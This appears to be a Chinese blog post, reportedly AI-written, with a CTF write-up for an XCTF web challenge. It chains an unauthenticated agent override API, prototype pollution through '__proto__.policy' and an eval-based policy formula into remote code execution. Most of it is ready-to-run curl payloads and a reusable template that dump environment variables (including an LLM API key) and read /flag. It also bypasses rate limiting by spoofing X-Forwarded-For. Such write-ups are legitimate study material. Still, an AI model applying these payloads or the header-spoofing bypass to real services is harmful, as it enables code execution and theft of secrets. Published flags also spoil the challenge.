---
title: Agentwp
published: 2026-05-08
description: AIWP
tags: [AIWP]
category: 技术
draft: false
---

纯AI，无添加）

# Agent Exploit Notes

## 目标

- 审计 `attachment` 附件项目
- 利用远端环境 `http://web-c4672aa5b6.adworld.xctf.org.cn:80/`
- 获取真实 flag

## 结论

- 假 flag 在本地种子数据里：
  - `ACTF{WuYan_1s_4_b19_Turt13_N07_7h3_F1n41_Fl4g}`
- 真实 flag 位于远端容器根目录 `/flag`
- 最终拿到的真实 flag：

```text
ACTF{1n_f4c7_∀_D0esn'7_ref3r_2_und3rwe4r_bu7_an_1nVer7ed_A}
```

## 核心漏洞

### 1. 未授权敏感接口

远端存在未鉴权接口：

- `POST /api/projects/:id/agent/override`
- `POST /api/jobs/:id/confirm`

其中 `override` 可以驱动后端执行完整的 dry-run 流程，并返回大量调试结果。

### 2. 路径拼接可控

`scope`、`environment`、`section`、`field` 仅做了 `trim()`，随后被拼接进 JSONPath 风格路径中，用于配置更新。

这导致攻击者可以控制最终写入目标。

### 3. 原型污染

通过构造：

```text
field=__proto__.policy
```

可在 `config.diff` / `applyChanges` 过程中污染 `Object.prototype`。

虽然 dry-run 不会真正写回 YAML 文件，但同一次请求内原型污染已经生效。

### 4. 同请求内策略劫持

后续 `policy.evaluate` 读取：

```js
const workspacePolicy = repoFacts.policy || {};
```

这里没有 `hasOwnProperty` 检查，因此会命中被污染的原型属性 `policy`。

这样就能把攻击者伪造的策略对象注入到后续逻辑里。

### 5. 兼容模式下的危险 `eval`

只要注入的策略中包含：

- `formula`
- `bindingProfile: "compat"`

后端就会走兼容解释路径，最终执行：

```js
eval(`(function(${argNames.join(',')}) { return (${expression}); })`)(...argValues)
```

从而获得表达式执行能力。

## 利用思路

完整利用链如下：

1. 调用未鉴权 `override` 接口
2. 用 `field=__proto__.policy` 污染 `Object.prototype`
3. 伪造 `policy`，把 `formula` 注入策略系统
4. 触发 `policy.evaluate`
5. 在 `compat` 模式下走到 `eval`
6. 把表达式返回值通过 `job.result.evaluation.formulaResult` 回显
7. 先枚举环境和目录，再直接读取 `/flag`

## 关键细节

### 1. 为什么 `this.process.version` 能执行

虽然表达式校验会拦一些危险标识符，但兼容模式下最终仍会进入 `eval`。

实测可用的基线表达式：

```js
this.process.version
```

远端回显：

```text
v20.20.2
```

说明表达式执行链成立。

### 2. 为什么不用 `require`

直接尝试：

```js
this.process.constructor.constructor("return require('fs').readdirSync('/')")()
```

远端会报：

```text
require is not defined
```

但 Node 20 提供了：

```js
process.getBuiltinModule("fs")
```

因此可直接通过它获取内建 `fs` 模块。

### 3. 限速绕过

服务按 `X-Forwarded-For` 做限速，并且信任该头。

所以每次请求只要更换一个新的 `X-Forwarded-For` 即可持续利用。

## 利用过程

### 步骤 1：验证表达式执行

Payload：

```bash
curl -sS 'http://web-c4672aa5b6.adworld.xctf.org.cn:80/api/projects/workspace-main/agent/override' \
  -H 'Content-Type: application/json' \
  -H 'X-Forwarded-For: 11.22.33.44' \
  --data-binary @- <<'EOF'
{
  "instruction": "policy proto test",
  "scope": "release",
  "environment": "staging",
  "section": "image",
  "field": "__proto__.policy",
  "value": {
    "formula": "this.process.version",
    "bindingProfile": "compat",
    "resultProfile": "wide",
    "selectorProfile": "linked",
    "exposeDebugContext": true
  },
  "dryRun": true
}
EOF
```

关注返回字段：

```text
job.result.evaluation.formulaResult
```

成功回显：

```text
v20.20.2
```

### 步骤 2：枚举环境变量

Payload：

```bash
curl -sS 'http://web-c4672aa5b6.adworld.xctf.org.cn:80/api/projects/workspace-main/agent/override' \
  -H 'Content-Type: application/json' \
  -H 'X-Forwarded-For: 11.22.33.60' \
  --data-binary '{
    "instruction":"env json test",
    "scope":"release",
    "environment":"staging",
    "section":"image",
    "field":"__proto__.policy",
    "value":{
      "formula":"JSON.stringify(this.process.env)",
      "bindingProfile":"compat",
      "resultProfile":"wide",
      "selectorProfile":"linked",
      "exposeDebugContext":true
    },
    "dryRun":true
  }'
```

回显中能看到：

- `PWD=/app`
- `HOME=/root`
- `NODE_VERSION=20.20.2`
- `LLM_API_KEY=...`

但没有直接给出 flag。

### 步骤 3：枚举根目录

Payload：

```bash
curl -sS 'http://web-c4672aa5b6.adworld.xctf.org.cn:80/api/projects/workspace-main/agent/override' \
  -H 'Content-Type: application/json' \
  -H 'X-Forwarded-For: 11.22.33.61' \
  --data-binary '{
    "instruction":"builtin fs root test",
    "scope":"release",
    "environment":"staging",
    "section":"image",
    "field":"__proto__.policy",
    "value":{
      "formula":"this.process.getBuiltinModule(\"fs\").readdirSync(\"/\").join(\",\")",
      "bindingProfile":"compat",
      "resultProfile":"wide",
      "selectorProfile":"linked",
      "exposeDebugContext":true
    },
    "dryRun":true
  }'
```

返回结果中出现：

```text
.dockerenv,app,bin,boot,dev,etc,flag,home,lib,lib64,media,mnt,opt,proc,root,run,sbin,srv,sys,tmp,usr,var
```

确认根目录存在 `/flag`。

### 步骤 4：读取真实 flag

最终 payload：

```bash
curl -sS 'http://web-c4672aa5b6.adworld.xctf.org.cn:80/api/projects/workspace-main/agent/override' \
  -H 'Content-Type: application/json' \
  -H 'X-Forwarded-For: 11.22.33.63' \
  --data-binary '{
    "instruction":"read root flag",
    "scope":"release",
    "environment":"staging",
    "section":"image",
    "field":"__proto__.policy",
    "value":{
      "formula":"this.process.getBuiltinModule(\"fs\").readFileSync(\"/flag\",\"utf8\")",
      "bindingProfile":"compat",
      "resultProfile":"wide",
      "selectorProfile":"linked",
      "exposeDebugContext":true
    },
    "dryRun":true
  }'
```

从响应字段：

```text
job.result.evaluation.formulaResult
```

读出真实 flag：

```text
ACTF{1n_f4c7_∀_D0esn'7_ref3r_2_und3rwe4r_bu7_an_1nVer7ed_A}
```

## 可复用 Payload 模板

```bash
curl -sS 'http://web-c4672aa5b6.adworld.xctf.org.cn:80/api/projects/workspace-main/agent/override' \
  -H 'Content-Type: application/json' \
  -H 'X-Forwarded-For: REPLACE_IP' \
  --data-binary @- <<'EOF'
{
  "instruction": "REPLACE_DESC",
  "scope": "release",
  "environment": "staging",
  "section": "image",
  "field": "__proto__.policy",
  "value": {
    "formula": "REPLACE_EXPRESSION",
    "bindingProfile": "compat",
    "resultProfile": "wide",
    "selectorProfile": "linked",
    "exposeDebugContext": true
  },
  "dryRun": true
}
EOF
```

示例表达式：

```text
this.process.version
JSON.stringify(this.process.env)
this.process.getBuiltinModule("fs").readdirSync("/").join(",")
this.process.getBuiltinModule("fs").readFileSync("/flag","utf8")
```

## 风险总结

这个题本质上是多漏洞串联：

- 未授权接口
- 原型污染
- 不安全的策略继承
- 兼容模式下 `eval`
- 调试结果直接回显

任意单点都已经很危险，组合后就是稳定的远程表达式执行和任意文件读取。

## 附

![1778399906959](1778399906959.png)

白嫖token(?)